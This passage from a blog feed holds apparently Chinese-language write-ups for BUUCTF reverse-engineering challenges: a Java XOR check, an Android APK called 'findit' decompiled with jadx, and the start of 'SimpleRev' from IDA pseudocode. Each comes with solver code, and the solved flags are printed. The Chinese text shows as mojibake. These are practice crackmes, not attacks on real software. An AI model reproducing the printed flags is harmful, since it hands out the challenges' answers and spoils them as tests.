å¯†</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Encrypt</span><span class="params">(<span class="type">char</span> arr[])</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">ArrayList</span> <span class="variable">Resultlist</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> arr[i] + <span class="number">64</span> ^ <span class="number">0x20</span>;  <span class="comment">//æ³¨æ„è¿ç®—ä¼˜å…ˆçº§, +çš„ä¼˜å…ˆçº§æ›´é«˜</span></span><br><span class="line">            Resultlist.add(Integer.valueOf(result));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> KEY[] = &#123;</span><br><span class="line">            <span class="number">180</span>, <span class="number">136</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">148</span>, <span class="number">136</span>, </span><br><span class="line">            <span class="number">133</span>, <span class="number">191</span>, <span class="number">134</span>, <span class="number">140</span>, <span class="number">129</span>, <span class="number">135</span>, <span class="number">191</span>, <span class="number">65</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ArrayList</span> <span class="variable">KEYList</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; KEY.length; j++)</span><br><span class="line">            KEYList.add(Integer.valueOf(KEY[j]));</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Result:&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(Resultlist.equals(KEYList))  <span class="comment">//é€ä¸ªå…ƒç´ åˆ¤æ–­Resultlistå’ŒKEYListæ˜¯å¦ç›¸åŒ</span></span><br><span class="line">            System.out.println(<span class="string">&quot;Congratulations\uFF01&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            System.err.println(<span class="string">&quot;Error\uFF01&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æ²¡å­¦è¿‡<code>Java</code>, ç½‘ä¸ŠæŸ¥äº†æŸ¥ä¸æ‡‚çš„åœ°æ–¹,
è¿™ä¸ªç¨‹åºçš„è¿›è¡Œçš„æ“ä½œå¦‚ä¸‹:</p>
<p>æŠŠè¾“å…¥çš„å­—ç¬¦ä¸²è½¬æˆä¸€ä¸ª<code>char</code>æ•°ç»„,
<code>char</code>æ•°ç»„çš„æ¯ä¸ªå…ƒç´ åŠ ä¸Š<code>64</code>å†ä¸<code>0x20</code>å¼‚æˆ–,
å†è½¬æˆ<code>Integer</code>ç±»å‹æ”¾è¿›åˆ—è¡¨<code>Resultlist</code>,
æŠŠ<code>KEY</code>æ•°ç»„çš„æ¯ä¸ªå…ƒç´ ä¹Ÿé€ä¸ªè½¬æˆ<code>Integer</code>ç±»å‹æ·»åŠ åˆ°å¦ä¸€ä¸ªåˆ—è¡¨<code>KEYList</code>,
é€ä¸ªå…ƒç´ æ¯”è¾ƒåˆ¤æ–­<code>Resultlist</code>å’Œ<code>KEYList</code>æ˜¯å¦ç›¸ç­‰</p>
<p>è¿™é‡Œå†æ¬¡ç”¨åˆ°äº†å…³äºå¼‚æˆ–çš„çŸ¥è¯†ç‚¹, è§<a
href="/2022/01/21/%5BReverse%5Dxor/">[BUUCTF]xor</a></p>
<p>è§£å¯†ä»£ç å¦‚ä¸‹</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span> str[] = &#123;</span><br><span class="line">		<span class="number">180</span>, <span class="number">136</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">148</span>,</span><br><span class="line">		<span class="number">136</span>,<span class="number">133</span>, <span class="number">191</span>, <span class="number">134</span>, <span class="number">140</span>, <span class="number">129</span>, <span class="number">135</span>, <span class="number">191</span>, <span class="number">65</span></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">sizeof</span>(str); i++)</span><br><span class="line">	&#123;</span><br><span class="line">		str[i] ^= <span class="number">0x20</span>;</span><br><span class="line">		str[i] -= <span class="number">64</span>;</span><br><span class="line">		<span class="built_in">putchar</span>(str[i]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//This_is_the_flag_!</span></span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥<strong>flag</strong>å°±æ˜¯<code>flag&#123;This_is_the_flag_!&#125;</code></p>
]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>Javaé€†å‘</tag>
      </tags>
  </entry>
  <entry>
    <title>[BUUCTF]findit</title>
    <url>/2022/01/23/%5BReverse%5Dfindit/</url>
    <content><![CDATA[<p>æ˜¯ä¸ª<code>apk</code>, æ‹¿<code>AndroidKiller</code>åç¼–è¯‘,
æ‰¾åˆ°ä¸€ä¸ª<code>Unicode</code>å­—ç¬¦ä¸²</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201231431068.png"
alt="image-20220123143139971" />
<figcaption aria-hidden="true">image-20220123143139971</figcaption>
</figure>
<p>è§£ç ä¸€çœ‹, å“ˆå“ˆé«˜å…´çš„å¤ªæ—©äº†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">string = <span class="string">&quot;\u7b54\u6848\u9519\u4e86\u80bf\u4e48\u529e\u3002\u3002\u3002\</span></span><br><span class="line"><span class="string">            \u4e0d\u7ed9\u4f60\u53c8\u4e0d\u597d\u610f\u601d\u3002\u3002\</span></span><br><span class="line"><span class="string">            \u3002\u54ce\u5440\u597d\u7ea0\u7ed3\u554a~~~&quot;</span></span><br><span class="line"><span class="built_in">print</span>(string)</span><br><span class="line"><span class="comment">#ç­”æ¡ˆé”™äº†è‚¿ä¹ˆåŠã€‚ã€‚ã€‚            ä¸ç»™ä½ åˆä¸å¥½æ„æ€ã€‚ã€‚            ã€‚å“å‘€å¥½çº ç»“å•Š~~~</span></span><br></pre></td></tr></table></figure>
<p>åœ¨<code>MainActivity.smali</code>é‡Œé¢æ‰¾åˆ°äº†å‡ ä¸ªæ•°ç»„,
å¾ˆå¯èƒ½å’Œ<strong>flag</strong>æœ‰å…³</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201231616264.png"
alt="image-20220123161621158" />
<figcaption aria-hidden="true">image-20220123161621158</figcaption>
</figure>
<p><code>smali</code>æ ¼å¼é˜…è¯»èµ·æ¥å¾ˆä¸æ–¹ä¾¿,
éœ€è¦å°†å®ƒè¿˜åŸæˆ<code>Java</code>ä»£ç ,
ä½†æ˜¯<code>AndroidKiller</code>ä¸æ”¯æŒè¿™ç§åŠŸèƒ½,
æ‰€ä»¥æ”¹ç”¨<code>jadx</code>.</p>
<blockquote>
<p>jadx: <a href="https://github.com/skylot/jadx">Github</a></p>
</blockquote>
<p>ç”¨<code>jadx-gui</code>ç›´æ¥æ‰“å¼€<code>apk</code>, æºç å°±å‡ºæ¥äº†,
åˆ°<code>MainActivity</code>ä¸€çœ‹, æœç„¶å’Œ<strong>flag</strong>æœ‰å…³</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201231633521.png"
alt="image-20220123163357380" />
<figcaption aria-hidden="true">image-20220123163357380</figcaption>
</figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.findit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.ActionBarActivity;</span><br><span class="line"><span class="keyword">import</span> android.view.MenuItem;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">ActionBarActivity</span> &#123;</span><br><span class="line">    <span class="comment">/* access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.support.v7.app.ActionBarActivity, android.support.v4.app.FragmentActivity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">EditText</span> <span class="variable">edit</span> <span class="operator">=</span> (EditText) findViewById(R.id.widget2);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">TextView</span> <span class="variable">text</span> <span class="operator">=</span> (TextView) findViewById(R.id.widget1);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">char</span>[] a = &#123;<span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;e&#x27;</span>&#125;;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">char</span>[] b = &#123;<span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>&#125;;</span><br><span class="line">        ((Button) findViewById(R.id.widget3)).setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="comment">/* class com.example.findit.MainActivity.AnonymousClass1 */</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="type">char</span>[] x = <span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">17</span>];</span><br><span class="line">                <span class="type">char</span>[] y = <span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">38</span>];</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">17</span>; i++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> ((a[i] &lt; <span class="string">&#x27;I&#x27;</span> &amp;&amp; a[i] &gt;= <span class="string">&#x27;A&#x27;</span>) || (a[i] &lt; <span class="string">&#x27;i&#x27;</span> &amp;&amp; a[i] &gt;= <span class="string">&#x27;a&#x27;</span>)) &#123;</span><br><span class="line">                        x[i] = (<span class="type">char</span>) (a[i] + <span class="number">18</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((a[i] &lt; <span class="string">&#x27;A&#x27;</span> || a[i] &gt; <span class="string">&#x27;Z&#x27;</span>) &amp;&amp; (a[i] &lt; <span class="string">&#x27;a&#x27;</span> || a[i] &gt; <span class="string">&#x27;z&#x27;</span>)) &#123;</span><br><span class="line">                        x[i] = a[i];</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        x[i] = (<span class="type">char</span>) (a[i] - <span class="string">&#x27;\b&#x27;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (String.valueOf(x).equals(edit.getText().toString())) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">0</span>; i2 &lt; <span class="number">38</span>; i2++) &#123;</span><br><span class="line">                        <span class="keyword">if</span> ((b[i2] &lt; <span class="string">&#x27;A&#x27;</span> || b[i2] &gt; <span class="string">&#x27;Z&#x27;</span>) &amp;&amp; (b[i2] &lt; <span class="string">&#x27;a&#x27;</span> || b[i2] &gt; <span class="string">&#x27;z&#x27;</span>)) &#123;</span><br><span class="line">                            y[i2] = b[i2];</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            y[i2] = (<span class="type">char</span>) (b[i2] + <span class="number">16</span>);</span><br><span class="line">                            <span class="keyword">if</span> ((y[i2] &gt; <span class="string">&#x27;Z&#x27;</span> &amp;&amp; y[i2] &lt; <span class="string">&#x27;a&#x27;</span>) || y[i2] &gt;= <span class="string">&#x27;z&#x27;</span>) &#123;</span><br><span class="line">                                y[i2] = (<span class="type">char</span>) (y[i2] - <span class="number">26</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    text.setText(String.valueOf(y));</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                text.setText(<span class="string">&quot;ç­”æ¡ˆé”™äº†è‚¿ä¹ˆåŠã€‚ã€‚ã€‚ä¸ç»™ä½ åˆä¸å¥½æ„æ€ã€‚ã€‚ã€‚å“å‘€å¥½çº ç»“å•Š~~~&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onOptionsItemSelected</span><span class="params">(MenuItem item)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (item.getItemId() == R.id.action_settings) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.onOptionsItemSelected(item);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¥½åœ¨<code>Java</code>çš„è¯­æ³•å’Œ<code>C/C++</code>ç±»ä¼¼,
å¯ä»¥å¤§æ¦‚çœ‹å‡ºæ¥æ˜¯ä¸ªå•¥æ„æ€:</p>
<p>å…ˆå¯¹<code>a</code>æ•°ç»„è¿›è¡Œå¤„ç†, æ”¾åˆ°<code>x</code>æ•°ç»„ä¸­,
å¯¹æ¯”ç”¨æˆ·çš„è¾“å…¥å’Œ<code>x</code>æ•°ç»„æ˜¯å¦ç›¸åŒ,
è‹¥ç›¸åŒåˆ™å¯¹<code>b</code>æ•°ç»„è¿›è¡Œå¤„ç†æ”¾åˆ°<code>y</code>æ•°ç»„ä¸­å¹¶æ˜¾ç¤ºå‡ºæ¥,
æƒ³å¿…<code>y</code>æ•°ç»„ä¸­çš„å°±æ˜¯<strong>flag</strong>.</p>
<p>è§£å¯†ä»£ç å¦‚ä¸‹:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> a[] = &#123; <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;e&#x27;</span> &#125;;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> b[] = &#123; <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span> &#125;;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> x[<span class="number">64</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> y[<span class="number">64</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">17</span>; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> ((a[i] &lt; <span class="string">&#x27;I&#x27;</span> &amp;&amp; a[i] &gt;= <span class="string">&#x27;A&#x27;</span>) || (a[i] &lt; <span class="string">&#x27;i&#x27;</span> &amp;&amp; a[i] &gt;= <span class="string">&#x27;a&#x27;</span>)) &#123;</span><br><span class="line">			x[i] = (a[i] + <span class="number">18</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> ((a[i] &lt; <span class="string">&#x27;A&#x27;</span> || a[i] &gt; <span class="string">&#x27;Z&#x27;</span>) &amp;&amp; (a[i] &lt; <span class="string">&#x27;a&#x27;</span> || a[i] &gt; <span class="string">&#x27;z&#x27;</span>)) &#123;</span><br><span class="line">			x[i] = a[i];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			x[i] = (a[i] - <span class="string">&#x27;\b&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i2 = <span class="number">0</span>; i2 &lt; <span class="number">38</span>; i2++) &#123;</span><br><span class="line">		<span class="keyword">if</span> ((b[i2] &lt; <span class="string">&#x27;A&#x27;</span> || b[i2] &gt; <span class="string">&#x27;Z&#x27;</span>) &amp;&amp; (b[i2] &lt; <span class="string">&#x27;a&#x27;</span> || b[i2] &gt; <span class="string">&#x27;z&#x27;</span>)) &#123;</span><br><span class="line">			y[i2] = b[i2];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			y[i2] = (b[i2] + <span class="number">16</span>);</span><br><span class="line">			<span class="keyword">if</span> ((y[i2] &gt; <span class="string">&#x27;Z&#x27;</span> &amp;&amp; y[i2] &lt; <span class="string">&#x27;a&#x27;</span>) || y[i2] &gt;= <span class="string">&#x27;z&#x27;</span>) &#123;</span><br><span class="line">				y[i2] = (y[i2] - <span class="number">26</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Key:%s\nFlag:%s&quot;</span>, x, y);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Key:LzakAkLzwXdsyZgew</span></span><br><span class="line"><span class="comment">//Flag:flag&#123;c164675262033b4c49bdf7f9cda28a75&#125;</span></span><br><span class="line"><span class="comment">//ç”¨unsigned charæ˜¯å› ä¸ºå®æµ‹ç”¨charçš„è¯, è¿™ä¸ªflagçš„ç®—æ³•åœ¨C/C++é‡Œä¼šå‡ºç°æº¢å‡ºè€Œå‡ºç°ä¹±ç , </span></span><br><span class="line"><span class="comment">//æŸ¥äº†ä¸€ä¸‹æ˜¯å› ä¸ºJavaçš„charæ˜¯2å­—èŠ‚. è¿™ä¸ªflagçš„ç®—æ³•å…¶å®å°±æ˜¯ä½ç§»+16ä½ç±»å‡¯æ’’åŠ å¯†</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>é€†å‘</tag>
        <tag>Javaé€†å‘</tag>
        <tag>Androidé€†å‘</tag>
      </tags>
  </entry>
  <entry>
    <title>[BUUCTF]SimpleRev</title>
    <url>/2022/01/22/%5BReverse%5DSimpleRev/</url>
    <content><![CDATA[<p>ä¸æ˜¯PEæ–‡ä»¶, ç›´æ¥æ‹–è¿›<code>IDA</code>åˆ†æ, F5æŸ¥çœ‹ä¼ªä»£ç </p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201221410232.png"
alt="image-20220122141058186" />
<figcaption aria-hidden="true">image-20220122141058186</figcaption>
</figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Welcome to CTF game!\nPlease input d/D to start or input q/Q to quit this program: &quot;</span>);</span><br><span class="line">      v4 = getchar();</span><br><span class="line">      <span class="keyword">if</span> ( v4 != <span class="number">100</span> &amp;&amp; v4 != <span class="number">68</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      Decry();	<span class="comment">//é‡ç‚¹å°±åœ¨è¿™ä¸ªå‡½æ•°é‡Œé¢</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">113</span> || v4 == <span class="number">81</span> )</span><br><span class="line">      Exit(<span class="string">&quot;Welcome to CTF game!\nPlease input d/D to start or input q/Q to quit this program: &quot;</span>, argv);		<span class="comment">//é€€å‡ºå‡½æ•°è¿™é‡Œä¸ºå•¥è¦ä¼ å‚è¿›å»?ä¸æ˜¯å¾ˆæ‡‚</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Input fault format!&quot;</span>);</span><br><span class="line">    v3 = getchar();</span><br><span class="line">    <span class="built_in">putchar</span>(v3);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>Decry()</code>å‡½æ•°é•¿è¿™æ ·</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">Decry</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1; <span class="comment">// [rsp+Fh] [rbp-51h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+10h] [rbp-50h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+14h] [rbp-4Ch]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+1Ch] [rbp-44h]</span></span><br><span class="line">  <span class="type">char</span> src[<span class="number">8</span>]; <span class="comment">// [rsp+20h] [rbp-40h] BYREF</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+28h] [rbp-38h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+30h] [rbp-30h]</span></span><br><span class="line">  __int64 v9[<span class="number">2</span>]; <span class="comment">// [rsp+40h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+50h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v11; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v11 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="comment">/*__readfsqword()å‡½æ•°ä»FS:[Offset]è¯»å–4å­—é•¿çš„å†…å®¹,åŒç†è¿˜æœ‰__readfsbyte()ç­‰å‡½æ•°, æ­¤å¤„ä½œç”¨æœªçŸ¥*/</span></span><br><span class="line">  *(_QWORD *)src = <span class="number">0x534C43444E</span>LL;</span><br><span class="line">  v7 = <span class="number">0LL</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v9[<span class="number">0</span>] = <span class="number">0x776F646168</span>LL;</span><br><span class="line">  v9[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  text = (<span class="type">char</span> *)join(key3, v9);	<span class="comment">//è‡ªå®šä¹‰çš„å­—ç¬¦æ‹¼æ¥,text=&quot;killshadow&quot;</span></span><br><span class="line">  <span class="built_in">strcpy</span>(key, key1);</span><br><span class="line">  <span class="built_in">strcat</span>(key, src);		<span class="comment">//key=&quot;ADSFKNDCLS&quot;</span></span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  getchar();</span><br><span class="line">  v5 = <span class="built_in">strlen</span>(key);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( key[v3 % v5] &gt; <span class="number">64</span> &amp;&amp; key[v3 % v5] &lt;= <span class="number">90</span> )</span><br><span class="line">      key[i] = key[v3 % v5] + <span class="number">32</span>;	<span class="comment">//å°†keyä¸­æ¯ä¸ªå­—ç¬¦ç”±å¤§å†™è½¬æˆå°å†™</span></span><br><span class="line">    ++v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input your flag:&quot;</span>);</span><br><span class="line">  <span 